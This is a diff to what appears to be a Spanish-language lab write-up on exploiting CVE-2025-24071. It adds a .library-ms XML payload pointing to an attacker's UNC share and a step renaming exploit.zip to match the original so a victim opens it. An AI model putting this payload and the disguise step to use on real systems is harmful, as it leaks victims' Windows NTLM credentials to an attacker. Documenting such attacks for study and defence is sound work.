@@ -126,4 +126,20 @@ Primero, creamos el arma usando el repositorio PoC CVE-2025-24071 (o creamos uno
 
 ![[Pasted image 20250528130756.png]]
 
-esto creara un
+esto creara un archivo xml parecido a este 
+
+```python
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<simpleLocation>
+  <url>\\10.10.45.11\shared</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+El exploit está dentro exploit.zip. Ahora lo renombramos para que coincida con el original.
+
